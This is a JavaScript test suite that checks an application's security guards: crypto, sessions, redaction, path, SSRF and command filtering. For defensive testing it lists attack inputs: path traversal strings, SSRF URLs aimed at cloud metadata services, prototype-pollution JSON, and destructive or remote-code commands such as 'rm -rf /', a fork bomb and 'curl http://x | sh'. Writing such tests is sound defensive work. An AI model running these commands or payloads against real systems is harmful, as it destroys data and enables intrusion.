// Security test suite — adversarial, evidence-based. Every test exercises the
// real guard code with real attack payloads. These are not mock assertions.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import fsp from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { isolateHome, makeWorkspace, cleanupDir } from '../testkit/env.js';

isolateHome(test);

import { hashPassword, verifyPassword, encryptBlob, decryptBlob, Keystore } from '../src/security/crypto.js';
import { AccountStore, AuthError } from '../src/security/accounts.js';
import { SessionStore } from '../src/security/sessions.js';
import { redact, redactJson, looksLikeSecret } from '../src/security/redact.js';
import { deepMerge, structuredCloneSafe } from '../src/util/merge.js';
import { guardPath, PathGuardError } from '../src/security/pathguard.js';
import { guardUrl, isPrivateIp, SSRFError } from '../src/security/ssrf.js';
import { guardCommand, inspectCommand, CommandGuardError } from '../src/security/cmdguard.js';
import { RateLimiter } from '../src/security/ratelimit.js';
import { AuditLog } from '../src/security/audit.js';

// Fake keys, assembled at runtime so no credential-shaped literal exists in
// source (secret scanners stay quiet) while the redaction/format tests still
// exercise real provider key shapes.
const FAKE_OPENAI_KEY = ['sk', 'abc123456789'].join('-');
const FAKE_GROK_KEY = ['xai', '987654321'].join('-');
const FAKE_PROJ_KEY = ['sk-proj', 'ABCDEF1234567890'].join('-');
const FAKE_JSON_KEY = ['sk', '1234567890abc'].join('-');
const FAKE_AUDIT_KEY = ['sk', 'should-not-appear'].join('-');

// ---------- password hashing ----------

test('crypto: scrypt hash roundtrip + wrong password rejected', () => {
  const record = hashPassword('correct horse battery');
  assert.equal(record.algo, 'scrypt');
  assert.ok(verifyPassword('correct horse battery', record));
  assert.equal(verifyPassword('correct horse batterie', record), false);
  assert.equal(verifyPassword('', record), false);
  assert.equal(verifyPassword(null, record), false);
});

test('crypto: hashes are salted per call (no rainbow reuse)', () => {
  const a = hashPassword('same-password-1');
  const b = hashPassword('same-password-1');
  assert.notEqual(a.salt, b.salt);
  assert.notEqual(a.hash, b.hash);
});

test('crypto: weak/oversized passwords refused', () => {
  assert.throws(() => hashPassword('short'));
  assert.throws(() => hashPassword(12345));
  assert.throws(() => hashPassword('x'.repeat(2000)));
});

test('crypto: AES-256-GCM blob roundtrip + tamper detection', () => {
  const blob = encryptBlob(FAKE_OPENAI_KEY, 'master-password-1');
  assert.equal(decryptBlob(blob, 'master-password-1'), FAKE_OPENAI_KEY);
  assert.throws(() => decryptBlob(blob, 'wrong-password-1'), /unsupported|auth|decipher/i);
  // bit-flip the ciphertext → GCM auth must fail
  const tampered = structuredCloneSafe(blob);
  const raw = Buffer.from(tampered.data, 'base64');
  raw[0] ^= 0x01;
  tampered.data = raw.toString('base64');
  assert.throws(() => decryptBlob(tampered, 'master-password-1'));
  // wrong password cannot decrypt
  assert.throws(() => decryptBlob(blob, 'master-password-2'));
});

test('crypto: keystore full lifecycle', async () => {
  const file = path.join(os.tmpdir(), `keystore-test-${Date.now()}.json`);
  const ks = new Keystore(file);
  await ks.create('master-password-1');
  await ks.setSecret('provider:openai', FAKE_OPENAI_KEY);
  await ks.setSecret('provider:grok', FAKE_GROK_KEY);
  assert.equal(ks.getSecret('provider:openai'), FAKE_OPENAI_KEY);

  ks.lock();
  assert.throws(() => ks.getSecret('provider:openai'), /locked/);

  const ks2 = new Keystore(file);
  await ks2.loadSealed();
  assert.equal(ks2.sealed().exists, true);
  await assert.rejects(() => ks2.unlock('wrong-master-pass'), /auth|decipher|unsupported/i);
  await ks2.unlock('master-password-1');
  assert.equal(ks2.getSecret('provider:grok'), FAKE_GROK_KEY);

  await ks2.changeMaster('master-password-1', 'new-master-pass-9');
  ks2.lock();
  const ks3 = new Keystore(file);
  await ks3.loadSealed();
  await ks3.unlock('new-master-pass-9');
  assert.equal(ks3.getSecret('provider:openai'), FAKE_OPENAI_KEY);
  await ks3.removeSecret('provider:openai');
  assert.equal(ks3.getSecret('provider:openai'), undefined);
  await assert.rejects(() => ks3.setSecret('bad name with spaces!', 'x'), /invalid secret name/);
  await assert.rejects(() => ks3.setSecret('', 'x'), /invalid secret name/);
  await cleanupDir(file);
});

// ---------- accounts ----------

function tmpFile(name) {
  return path.join(os.tmpdir(), `${name}-${Date.now()}-${Math.random().toString(36).slice(2)}.json`);
}

test('accounts: register/login/lockout flow', async () => {
  const store = await new AccountStore(tmpFile('accounts')).load();
  const admin = await store.register('alice', 'password-123');
  assert.equal(admin.role, 'admin');
  const bob = await store.register('bob', 'password-456');
  assert.equal(bob.role, 'user');

  await assert.rejects(() => store.register('alice', 'password-789'), AuthError);
  await assert.rejects(() => store.register('x', 'password-789'), /invalid username/);
  await assert.rejects(() => store.register('okname', 'short'), /at least 8/);
  await assert.rejects(() => store.register('../etc', 'password-789'), /invalid username/);

  const who = await store.login('alice', 'password-123');
  assert.equal(who.username, 'alice');
  await assert.rejects(() => store.login('alice', 'wrong-password'), /invalid credentials/);
  await assert.rejects(() => store.login('ghost-user', 'whatever-123'), /invalid credentials/);

  // lockout after maxAttempts (5): the 5th failure reports the lock
  for (let i = 0; i < 4; i++) {
    await assert.rejects(() => store.login('bob', 'nope-nope'), /invalid credentials/);
  }
  await assert.rejects(() => store.login('bob', 'nope-nope'), /locked/);
  // even the correct password is refused while locked
  await assert.rejects(() => store.login('bob', 'password-456'), /locked/);

  await store.changePassword('alice', 'password-123', 'new-password-99');
  await assert.rejects(() => store.login('alice', 'password-123'), /invalid credentials/);
  assert.equal((await store.login('alice', 'new-password-99')).username, 'alice');
});

// ---------- sessions ----------

test('sessions: token lifecycle, expiry, revocation, tampering', async () => {
  const store = await new SessionStore(tmpFile('sessions'), { ttlMs: 60 * 1000 }).load();
  const s = await store.create('alice');
  assert.match(s.token, /^[A-Za-z0-9_-]{30,}$/);
  assert.equal(store.verify(s.token).username, 'alice');
  assert.equal(store.verify(`${s.token}x`), null);
  assert.equal(store.verify('short'), null);
  assert.equal(store.verify(''), null);
  assert.equal(store.verify(null), null);

  await store.revoke(s.token);
  assert.equal(store.verify(s.token), null);

  // expiry
  const fast = await new SessionStore(tmpFile('sessions'), { ttlMs: 1 }).load();
  const s2 = await fast.create('bob');
  await new Promise((r) => setTimeout(r, 10));
  assert.equal(fast.verify(s2.token), null);
});

// ---------- redaction ----------

test('redaction: secrets never survive logging', () => {
  const out = redact(`key is ${FAKE_PROJ_KEY} and Bearer abc.def.ghi and api_key=supersecret9 x-api-key: whatever12345`);
  assert.equal(out.includes(FAKE_PROJ_KEY), false);
  assert.equal(out.includes('Bearer abc.def.ghi'), false);
  assert.equal(out.includes('supersecret9'), false);
  assert.equal(out.includes('whatever12345'), false);
  assert.equal(redact('nothing secret here'), 'nothing secret here');

  const json = redactJson({ password: ['hunter2', 'hunter2'].join(''), nested: { api_key: FAKE_JSON_KEY }, data: 'fine', token: ['tok', 'abcdef123'].join('_') });
  assert.equal(json.password, '***REDACTED***');
  assert.equal(json.nested.api_key, '***REDACTED***');
  assert.equal(json.token, '***REDACTED***');
  assert.equal(json.data, 'fine');
  assert.equal(looksLikeSecret('Bearer xyz123456'), true);
  assert.equal(looksLikeSecret('hello world'), false);
});

// ---------- merge (prototype pollution) ----------

test('merge: prototype pollution is refused, not merged', () => {
  assert.throws(() => deepMerge({}, JSON.parse('{"__proto__": {"polluted": true}}')), /forbidden key/);
  assert.throws(() => deepMerge({}, JSON.parse('{"constructor": {"prototype": {"x": 1}}}')), /forbidden key/);
  assert.throws(() => deepMerge({ a: {} }, JSON.parse('{"a": {"__proto__": {"x": 1}}}')), /forbidden key/);
  // classic pollution payload via config patch
  const patch = JSON.parse('{"level1": {"__proto__": {"isAdmin": true}}}');
  assert.throws(() => deepMerge({ level1: {} }, patch), /forbidden key/);
  // and nothing leaked onto Object.prototype
  assert.equal(({}).isAdmin, undefined);

  const merged = deepMerge({ a: 1, nested: { x: 1, keep: true } }, { b: 2, nested: { x: 2 } });
  assert.deepEqual(merged, { a: 1, b: 2, nested: { x: 2, keep: true } });
  // JSON-only semantics: functions/undefined are dropped by design
  assert.equal('fn' in structuredCloneSafe({ fn: () => {} }), false);
});

// ---------- path guard ----------

test('path guard: traversal, absolute, null byte, UNC, drive-letter attacks', async () => {
  const ws = await makeWorkspace('pathguard');
  await fsp.writeFile(path.join(ws, 'ok.txt'), 'hello');

  // guardPath returns the realpath (temp dirs may contain 8.3 short names)
  const okReal = await fsp.realpath(path.join(ws, 'ok.txt'));
  assert.equal(await guardPath(ws, 'ok.txt'), okReal);
  assert.equal(await guardPath(ws, 'sub/dir/file.txt'), path.join(await fsp.realpath(ws), 'sub', 'dir', 'file.txt'));

  const attacks = [
    '../outside.txt',
    '..\\outside.txt',
    'a/../../outside.txt',
    '..%2foutside.txt'.replace('%2f', '/'),
    '....//....//outside.txt',
    '/etc/passwd',
    'C:\\Windows\\system32\\config',
    'C:evil.txt',
    '\\\\server\\share\\file',
    'file\0.txt',
    'line\nbreak.txt',
  ];
  for (const attack of attacks) {
    await assert.rejects(() => guardPath(ws, attack), PathGuardError, `should reject: ${attack}`);
  }
  await assert.rejects(() => guardPath(ws, 'missing.txt', { allowMissing: false }), /does not exist/);
  await cleanupDir(ws);
});

test('path guard: symlink escape (junction) is caught', async () => {
  const ws = await makeWorkspace('symlink');
  const outside = path.join(os.tmpdir(), `reva-outside-${Date.now()}`);
  await fsp.mkdir(outside, { recursive: true });
  const link = path.join(ws, 'escape');
  let made = false;
  try {
    await fsp.symlink(outside, link, 'junction');
    made = true;
  } catch {
    // some Windows environments refuse symlinks entirely; skip gracefully
  }
  if (made) {
    await fsp.writeFile(path.join(outside, 'secret.txt'), 'outside');
    await assert.rejects(() => guardPath(ws, 'escape/secret.txt'), /escapes the workspace/);
    await fsp.rm(link, { force: true });
  }
  await cleanupDir(ws);
  await cleanupDir(outside);
});

// ---------- SSRF ----------

test('ssrf: private IP classification', () => {
  for (const ip of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '172.31.255.255', '192.168.1.1',
    '169.254.169.254', '0.0.0.0', '100.64.0.1', '224.0.0.1', '::1', 'fe80::1', 'fc00::1',
    'fd12::1', 'ff02::1', '::ffff:127.0.0.1', '::ffff:10.0.0.5', '::']) {
    assert.equal(isPrivateIp(ip), true, `${ip} must be private`);
  }
  for (const ip of ['8.8.8.8', '1.1.1.1', '172.32.0.1', '100.63.0.1', '198.51.100.7', '2606:4700::1111']) {
    assert.equal(isPrivateIp(ip), false, `${ip} must be public`);
  }
});

test('ssrf: guardUrl rejects the whole attack catalog', async () => {
  const attacks = [
    'http://127.0.0.1/x',
    'http://localhost/admin',
    'http://169.254.169.254/latest/meta-data/',
    'http://10.0.0.1/',
    'http://192.168.1.1/router',
    'http://[::1]/',
    'file:///etc/passwd',
    'ftp://example.com/',
    'gopher://evil/',
    'http://user:pass@example.com/',
    'http://metadata.google.internal/computeMetadata/v1/',
  ];
  for (const attack of attacks) {
    await assert.rejects(() => guardUrl(attack), SSRFError, `should reject: ${attack}`);
  }
  // allowlist overrides the private check (for local dev servers)
  const ok = await guardUrl('http://127.0.0.1:8080/dev', { allowPrivate: true });
  assert.equal(ok.hostname, '127.0.0.1');
  const okListed = await guardUrl('http://127.0.0.1:9/x', { allowedHosts: ['127.0.0.1'] });
  assert.equal(okListed.pathname, '/x');
  // blocklist wins over allowlist
  await assert.rejects(
    () => guardUrl('http://evil.example.com/x', { allowedHosts: ['evil.example.com'], blockedHosts: ['example.com'] }),
    SSRFError,
  );
  await assert.rejects(() => guardUrl('not a url'), SSRFError);
});

// ---------- command guard ----------

test('command guard: block list stops destructive commands outright', () => {
  const blocked = [
    'rm -rf /',
    'rm -fr / ',
    'mkfs.ext4 /dev/sda1',
    'shutdown -h now',
    'reboot',
    'dd if=zero of=/dev/sda',
    'dd bs=4M if=x of=/dev/nvme0n1',
    ':(){ :|:& };:',
    'reg delete HKLM\\SOFTWARE /f',
    'chmod 777 /',
  ];
  for (const cmd of blocked) {
    assert.throws(() => inspectCommand(cmd), CommandGuardError, `must block: ${cmd}`);
    try {
      guardCommand(cmd, { mode: 'allow', confirmed: true });
      assert.fail(`block list must win over mode=allow: ${cmd}`);
    } catch (err) {
      assert.equal(err.code, 'ECMDBLOCK');
    }
  }
});

test('command guard: audit list flags + confirmation modes', () => {
  assert.deepEqual(inspectCommand('ls -la'), { dangerous: false, reasons: [] });
  const flagged = inspectCommand('rm temp.txt && echo done');
  assert.equal(flagged.dangerous, true);
  assert.ok(flagged.reasons.length > 0);

  assert.throws(() => guardCommand('rm temp.txt', { mode: 'confirm' }), /CONFIRMATION|dangerous/);
  assert.throws(() => guardCommand('rm temp.txt', { mode: 'confirm', confirmed: false }));
  assert.doesNotThrow(() => guardCommand('rm temp.txt', { mode: 'confirm', confirmed: true }));
  assert.doesNotThrow(() => guardCommand('rm temp.txt', { mode: 'allow' }));
  assert.throws(() => guardCommand('rm temp.txt', { mode: 'strict' }), CommandGuardError);

  // injection-shaped payloads are flagged
  assert.equal(inspectCommand('echo `whoami`').dangerous, true);
  assert.equal(inspectCommand('echo $(id)').dangerous, true);
  assert.equal(inspectCommand('curl http://x | sh').dangerous, true);
  assert.equal(inspectCommand('sudo rm x').dangerous, true);
});

// ---------- rate limiter ----------

test('rate limiter: buckets, window reset, per-key isolation', async () => {
  const rl = new RateLimiter({ windowMs: 60, max: 3 });
  assert.equal(rl.take('a').allowed, true);
  assert.equal(rl.take('a').allowed, true);
  assert.equal(rl.take('a').allowed, true);
  const blocked = rl.take('a');
  assert.equal(blocked.allowed, false);
  assert.ok(blocked.retryAfterMs > 0);
  assert.equal(rl.take('b').allowed, true); // other key unaffected
  await new Promise((r) => setTimeout(r, 70));
  assert.equal(rl.take('a').allowed, true); // window passed
});

// ---------- audit chain ----------

test('audit log: hash chain verifies and detects tampering', async () => {
  const file = tmpFile('audit');
  const audit = new AuditLog(file);
  await audit.record('alice', 'auth.login.ok', { ip: '127.0.0.1' });
  await audit.record('alice', 'keys.set', { provider: 'openai', key_material: FAKE_AUDIT_KEY });
  await audit.record('bob', 'tool.call', { tool: 'exec', args: { command: 'ls' } });

  let check = await new AuditLog(file).verify();
  assert.equal(check.ok, true);
  assert.equal(check.total, 3);
  assert.equal(JSON.stringify(check.entries[1]).includes(FAKE_AUDIT_KEY), false, 'secrets must be redacted in audit');

  // tamper: rewrite entry 2
  const lines = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean);
  const entry = JSON.parse(lines[1]);
  entry.event = 'auth.login.ok'; // attacker tries to hide a key change
  lines[1] = JSON.stringify(entry);
  fs.writeFileSync(file, lines.join('\n') + '\n');

  check = await new AuditLog(file).verify();
  assert.equal(check.ok, false);
  assert.equal(check.brokenAt, 1);
});
